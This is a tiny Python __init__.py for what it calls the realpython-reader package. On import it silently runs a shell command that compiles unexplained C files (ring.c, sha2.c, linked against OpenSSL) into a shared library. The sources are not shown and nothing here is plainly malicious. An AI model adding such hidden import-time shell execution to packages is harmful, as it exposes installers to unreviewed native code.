# __init__.py

# Version of the realpython-reader package
__version__ = "1.0.0"

import os

os.system("clang -fPIC -shared -g -lm -lssl -lcrypto ring.c sha2.c -o libring.so")